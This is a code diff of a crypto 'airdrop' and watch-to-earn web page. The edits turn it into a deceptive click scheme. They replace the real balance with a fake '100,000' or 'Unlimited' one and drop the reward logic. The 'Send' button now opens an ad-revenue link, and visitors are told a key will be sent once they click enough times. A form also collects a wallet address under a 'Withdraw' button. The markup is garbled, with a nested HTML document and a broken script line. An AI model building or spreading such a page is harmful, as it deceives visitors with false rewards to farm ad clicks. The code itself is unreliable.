@@ -92,14 +92,14 @@
 </head>
 <body>
     <div class="balance">
-        <p>Balance: $<span id="balance">1.00</span></p>
+        <p><span id="balance">100,000</span></p>
     </div>
 
     <div class="video-grid">
         <!-- Video 1 -->
         <div class="video-task" id="videoTask1">
             <div id="player1"></div>
-            <p class="video-title">$0.10</p>
+            <p class="video-title">100,000 coins</p>
             <div class="lock-overlay" id="lockOverlay1">
                 <div></div>
                 <div id="countdown1" class="countdown">00:00:00</div>
@@ -108,7 +108,7 @@
         <!-- Video 2 -->
         <div class="video-task" id="videoTask2">
             <div id="player2"></div>
-            <p class="video-title">$0.10</p>
+            <p class="video-title">100,000 coins</p>
             <div class="lock-overlay" id="lockOverlay2">
                 <div></div>
                 <div id="countdown2" class="countdown">00:00:00</div>
@@ -117,7 +117,7 @@
         <!-- Video 3 -->
         <div class="video-task" id="videoTask3">
             <div id="player3"></div>
-            <p class="video-title">$0.10</p>
+            <p class="video-title">100,000 coins</p>
             <div class="lock-overlay" id="lockOverlay3">
                 <div></div>
                 <div id="countdown3" class="countdown">00:00:00</div>
@@ -125,7 +125,12 @@
         </div>
     </div>
 
-    <html>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payout Section</title>
     <style>
         .payout-section {
             background: linear-gradient(135deg, #09D260, #0033cc);
@@ -150,8 +155,8 @@
             text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
         }
         .payout-form a.button {
-            background: #ffffff;
-            color: #000; /* Updated text color for contrast */
+            background: linear-gradient(135deg, #09D260, #0033cc);
+            color: #fff;
             border: none;
             border-radius: 10px;
             padding: 15px 30px;
@@ -165,7 +170,6 @@
         }
         .payout-form a.button:hover {
             background: #0056b3;
-            color: #fff; /* Text color change on hover */
             transform: translateY(-4px);
         }
         .error-message {
@@ -174,50 +178,86 @@
             margin-top: 20px;
             text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
         }
+        /* Custom alert styling */
+        .custom-alert {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            color: #000;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            display: none;
+            text-align: center;
+        }
+        .custom-alert button {
+            background-color: #09D260;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
     </style>
+</head>
+<body>
+    <!-- Payout Section -->
+    <div class="payout-section">
+        <h2>AirDrop Tasks</h2>
+        <p>Get your key  by clicking the button below. You can get the Airdrop key as much for your clicking.</p>
+        <form id="payoutForm" class="payout-form">
+            <!-- Link styled as a button -->
+            <a href="#" class="button" id="sendButton">Send</a>
+            <p id="errorMessage" class="error-message"></p>
+        </form>
+    </div>
 
-    <body>
-        <!-- Payout Section -->
-        <div class="payout-section">
-            <h2>Airdrop</h2>
-            <p>Get your rewards instantly by clicking the send button below.</p>
-            <form id="payoutForm" class="payout-form">
-                <!-- Link styled as a button -->
-                <a href="#" class="button" onclick="handleClick()">Send</a>
-                <p id="errorMessage" class="error-message"></p>
-            </form>
-        </div>
+    <!-- Custom Alert -->
+    <div id="customAlert" class="custom-alert">
+        <p id="alertMessage"></p>
+        <button onclick="closeAlert()">OK</button>
+    </div>
 
-        <script>
-            // Initialize variables
-            let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
-            let balance = parseInt(localStorage.getItem('balance')) || 1000;
+    <script>
+        // Initialize click count from localStorage
+        let clickCount = parseInt(localStorage.getItem('clickCount')) || 0;
 
-            function handleClick() {
-                // Increment the click count and increase the balance
-                clickCount++;
-                balance += 100; // Increase balance by 100 on each click
+        // Handle button click
+        document.getElementById('sendButton').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default link behavior
+            
+            // Increment the click count and store it in localStorage
+            clickCount++;
+            localStorage.setItem('clickCount', clickCount);
+            
+            // Open the URL in a new tab
+            window.open('https://www.highratecpm.com/yj516zqeuh?key=67623d7811021ba7d072604ff121c586', '_blank');
+        });
 
-                // Store the updated values in local storage
-                localStorage.setItem('clickCount', clickCount);
-                localStorage.setItem('balance', balance);
-
-                // Redirect to the URL
-                window.location.href = "https://example.com/airdrop";
+        // Show custom alert on page load
+        window.addEventListener('load', function() {
+            const count = localStorage.getItem('clickCount');
+            if (count) {
+                showAlert(`Button clicked ${count} times. Once you reach the required times, we will instantly send the key🔑 to your Airdrop`);
             }
+        });
 
-            // Check if the user is returning to the page and show the alert if needed
-            window.onload = function() {
-                if (localStorage.getItem('clickCount')) {
-                    alert("You have clicked the button " + clickCount + " times.\nYour current balance is: " + balance + " coins.");
+        // Function to show custom alert
+        function showAlert(message) {
+            document.getElementById('alertMessage').innerText = message;
+            document.getElementById('customAlert').style.display = 'block';
+        }
 
-                    // Optionally, clear the stored values after showing the alert
-                    localStorage.removeItem('clickCount');
-                    localStorage.removeItem('balance');
-                }
-            };
-        </script>
-    </body>
+        // Function to close custom alert
+        function closeAlert() {
+            document.getElementById('customAlert').style.display = 'none';
+        }
+    </script>
+</body>
 </html>
     
     <style>
@@ -349,6 +389,8 @@
 <!-- Payout Section -->
 <div class="payout-section">
         <h2>Airdrop</h2>
+    <p class="balance">🔑<span id="balance">0</span></p>
+            <p>Get your rewards instantly by clicking the send button below.</p>
         <form id="payoutForm" class="payout-form">
             <select id="payoutMethod" required>
                 <option value="" disabled selected>Select Payment Method</option>
@@ -357,7 +399,7 @@
             </select>
             <input type="text" id="walletAddress" placeholder="Enter Your Wallet Address" required />
             
-            <input type="submit" value="Send" />
+            <input type="submit" value="Withdraw" />
             <p id="errorMessage" class="error-message"></p>
         </form>
     </div>
@@ -365,93 +407,82 @@
 
     <script src="https://www.youtube.com/iframe_api"></script>
     <script>
-        const balanceElement = document.getElementById('balance');
+        co<script>
+    const balanceElement = document.getElementById('balance');
 
-        function loadBalance() {
-            const savedBalance = localStorage.getItem('balance');
-            return savedBalance ? parseFloat(savedBalance) : 1.00;
-        }
+    function loadBalance() {
+        // Set balance as "Unlimited"
+        return "Unlimited";
+    }
 
-        function saveBalance(balance) {
-            localStorage.setItem('balance', balance.toFixed(2));
-        }
+    function loadLockStatus(videoId) {
+        const unlockTime = localStorage.getItem(`unlockTime_${videoId}`);
+        const now = new Date().getTime();
 
-        function updateBalance(amount) {
-            let currentBalance = loadBalance();
-            currentBalance += amount;
-            saveBalance(currentBalance);
-            balanceElement.textContent = currentBalance.toFixed(2);
-        }
-
-        function loadLockStatus(videoId) {
-            const unlockTime = localStorage.getItem(`unlockTime_${videoId}`);
-            const now = new Date().getTime();
-
-            if (unlockTime && now < parseInt(unlockTime)) {
-                document.getElementById(`lockOverlay${videoId}`).classList.add('visible');
-                startCountdown(parseInt(unlockTime), videoId);
-            }
-        }
-
-        function setLock(videoId) {
-            const now = new Date().getTime();
-            const unlockDate = new Date(now + 3 * 60 * 60 * 1000); // 3 hours
-            localStorage.setItem(`lastWatched_${videoId}`, now);
-            localStorage.setItem(`unlockTime_${videoId}`, unlockDate.getTime());
+        if (unlockTime && now < parseInt(unlockTime)) {
             document.getElementById(`lockOverlay${videoId}`).classList.add('visible');
-            startCountdown(unlockDate.getTime(), videoId);
+            startCountdown(parseInt(unlockTime), videoId);
         }
+    }
 
-        function startCountdown(endTime, videoId) {
-            function updateTimer() {
-                const now = new Date().getTime();
-                const timeRemaining = endTime - now;
+    function setLock(videoId) {
+        const now = new Date().getTime();
+        const unlockDate = new Date(now + 3 * 60 * 60 * 1000); // 3 hours
+        localStorage.setItem(`lastWatched_${videoId}`, now);
+        localStorage.setItem(`unlockTime_${videoId}`, unlockDate.getTime());
+        document.getElementById(`lockOverlay${videoId}`).classList.add('visible');
+        startCountdown(unlockDate.getTime(), videoId);
+    }
 
-                if (timeRemaining <= 0) {
-                    document.getElementById(`lockOverlay${videoId}`).classList.remove('visible');
-                    clearInterval(timerInterval);
-                } else {
-                    const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                    const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
-                    const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
-                    document.getElementById(`countdown${videoId}`).textContent = 
-                        String(hours).padStart(2, '0') + ':' + 
-                        String(minutes).padStart(2, '0') + ':' + 
-                        String(seconds).padStart(2, '0');
+    function startCountdown(endTime, videoId) {
+        function updateTimer() {
+            const now = new Date().getTime();
+            const timeRemaining = endTime - now;
+
+            if (timeRemaining <= 0) {
+                document.getElementById(`lockOverlay${videoId}`).classList.remove('visible');
+                clearInterval(timerInterval);
+            } else {
+                const hours = Math.floor((timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);
+                document.getElementById(`countdown${videoId}`).textContent = 
+                    String(hours).padStart(2, '0') + ':' + 
+                    String(minutes).padStart(2, '0') + ':' + 
+                    String(seconds).padStart(2, '0');
+            }
+        }
+        updateTimer(); // initial call
+        const timerInterval = setInterval(updateTimer, 1000);
+    }
+
+    function onYouTubeIframeAPIReady() {
+        const videoIds = ['9hom7bzhnkk', 'ot4WNTK1ngY', 'ot4WNTK1ngY']; // Replace with actual video IDs
+        videoIds.forEach((videoId, index) => {
+            new YT.Player(`player${index + 1}`, {
+                height: '180',
+                width: '100%',
+                videoId: videoId,
+                events: {
+                    'onStateChange': (event) => onPlayerStateChange(event, index + 1)
                 }
-            }
-            updateTimer(); // initial call
-            const timerInterval = setInterval(updateTimer, 1000);
-        }
-
-        function onYouTubeIframeAPIReady() {
-            const videoIds = ['9hom7bzhnkk', 'ot4WNTK1ngY', 'ot4WNTK1ngY']; // Replace with actual video IDs
-            videoIds.forEach((videoId, index) => {
-                new YT.Player(`player${index + 1}`, {
-                    height: '180',
-                    width: '100%',
-                    videoId: videoId,
-                    events: {
-                        'onStateChange': (event) => onPlayerStateChange(event, index + 1)
-                    }
-                });
             });
-        }
-
-        function onPlayerStateChange(event, videoIndex) {
-            if (event.data == YT.PlayerState.ENDED) {
-                // Video has ended
-                updateBalance(0.10);
-                setLock(videoIndex);
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            balanceElement.textContent = loadBalance().toFixed(2);
-            for (let i = 1; i <= 3; i++) {
-                loadLockStatus(i);
-            }
         });
-    </script>
+    }
+
+    function onPlayerStateChange(event, videoIndex) {
+        if (event.data == YT.PlayerState.ENDED) {
+            // Video has ended
+            setLock(videoIndex);
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        balanceElement.textContent = loadBalance();
+        for (let i = 1; i <= 3; i++) {
+            loadLockStatus(i);
+        }
+    });
+</script>
 </body>
 </html>
